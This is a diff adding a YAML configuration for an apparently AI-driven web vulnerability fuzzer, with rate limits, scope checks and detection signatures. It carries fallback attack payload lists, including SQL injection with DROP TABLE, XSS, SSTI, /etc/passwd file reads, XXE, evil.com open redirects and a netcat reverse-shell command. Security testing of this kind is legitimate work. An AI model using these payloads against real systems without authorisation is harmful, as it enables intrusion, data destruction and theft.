@@ -1,0 +1,154 @@
+# ============================================================
+# Smart Fuzzer Configuration — Centaur-Jarvis
+# ============================================================
+# This file defines defaults for the fuzzing engine.
+# All values can be overridden per-task via the task payload.
+
+# --- AI Iteration Limits ---
+max_iterations: 3                    # Max AI mutation cycles per parameter/vuln_type combo
+initial_payloads_per_type: 5         # Number of diverse initial payloads to request from AI
+
+# --- AI Verification ---
+verify_with_ai: true                 # Whether to verify potential findings with a second AI call
+ai_confidence_threshold: 0.8        # Reserved for future confidence scoring
+max_verification_attempts: 1         # Hard cap: only ONE verification call per finding (prevent loops)
+
+# --- Rate Limiting (per target host) ---
+rate_limit:
+  default_rate: 5                    # Requests per second per target host
+  default_burst: 10                  # Burst capacity (token bucket)
+  backoff_base: 2.0                  # Exponential backoff base for 429 responses
+  backoff_max: 60.0                  # Maximum backoff wait in seconds
+  retry_after_respect: true          # Honor Retry-After header from target
+
+# --- HTTP Executor Settings ---
+executor:
+  timeout: 10                        # Request timeout in seconds
+  follow_redirects: true             # Follow HTTP redirects
+  max_redirect_depth: 5              # Maximum redirect chain depth
+  scope_check_redirects: true        # If true, refuse redirects to out-of-scope domains
+  response_snippet_max_chars: 2000   # Max chars captured from response for AI mutation context
+
+# --- Redis Settings ---
+redis:
+  task_queue: "queue:smart_fuzzer"
+  result_queue: "results:incoming"
+  status_prefix: "task:status:"
+  blpop_timeout: 5                   # Seconds to block on BLPOP before re-checking
+  reconnect_max_retries: 10
+  reconnect_delay: 2.0
+  memory_buffer_max: 50              # Max results to buffer in memory if Redis is down
+
+# --- AI Payload Generation ---
+ai:
+  generation_retries: 2              # Retries if AI returns invalid format
+  mutation_temperature: 0.9          # Higher temperature for mutation creativity
+  generation_temperature: 0.7        # Standard temperature for initial generation
+  prompt_max_length: 4000            # Max prompt length sent to AI router
+
+# --- Static Fallback Payloads ---
+# Used when AI is unavailable or returns errors after retries.
+payloads:
+  fallback_sqli:
+    - "'"
+    - "\""
+    - "1' OR '1'='1"
+    - "1 AND 1=1"
+    - "1' UNION SELECT NULL--"
+    - "1; DROP TABLE test--"
+    - "' OR 1=1#"
+    - "1' AND SLEEP(5)--"
+
+  fallback_xss:
+    - "<script>alert(1)</script>"
+    - "<img src=x onerror=alert(1)>"
+    - "<svg/onload=alert(1)>"
+    - "'\"><script>alert(1)</script>"
+    - "javascript:alert(1)"
+    - "<body onload=alert(1)>"
+    - "<iframe src='javascript:alert(1)'>"
+    - "{{7*7}}"
+
+  fallback_ssti:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "<%= 7*7 %>"
+    - "#{7*7}"
+    - "{{config}}"
+    - "{{self.__class__.__mro__}}"
+    - "${T(java.lang.Runtime).getRuntime()}"
+
+  fallback_cmdi:
+    - "; ls"
+    - "| cat /etc/passwd"
+    - "$(whoami)"
+    - "`id`"
+    - "|| ping -c 1 127.0.0.1"
+    - "; sleep 5"
+    - "| nc -e /bin/sh 127.0.0.1 4444"
+
+  fallback_lfi:
+    - "../../etc/passwd"
+    - "..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "....//....//etc/passwd"
+    - "/etc/passwd%00"
+    - "php://filter/convert.base64-encode/resource=index.php"
+
+  fallback_xxe:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>'
+
+  fallback_open_redirect:
+    - "//evil.com"
+    - "https://evil.com"
+    - "/\\evil.com"
+    - "//evil.com/%2f%2e%2e"
+
+# --- Detection Signatures ---
+# Patterns in response body/headers that suggest a vulnerability was triggered.
+detection:
+  sqli_indicators:
+    - "SQL syntax"
+    - "mysql_fetch"
+    - "ORA-"
+    - "PostgreSQL"
+    - "sqlite3"
+    - "SQLSTATE"
+    - "unclosed quotation mark"
+    - "quoted string not properly terminated"
+    - "Microsoft OLE DB Provider"
+
+  xss_indicators:
+    # We check if the payload is reflected verbatim
+    - "__PAYLOAD_REFLECTED__"  # Special marker: code checks if exact payload appears in response
+
+  ssti_indicators:
+    - "49"  # Result of 7*7
+    - "config"
+    - "__class__"
+    - "Runtime"
+
+  cmdi_indicators:
+    - "root:"
+    - "uid="
+    - "gid="
+    - "daemon:"
+    - "bin/"
+
+  lfi_indicators:
+    - "root:x:0:0"
+    - "[extensions]"
+    - "boot loader"
+
+  waf_indicators:
+    status_codes: [403, 429, 406, 501]
+    body_patterns:
+      - "blocked"
+      - "firewall"
+      - "access denied"
+      - "not acceptable"
+      - "rate limit"
+      - "cloudflare"
+      - "akamai"
+      - "imperva"
+      - "mod_security"
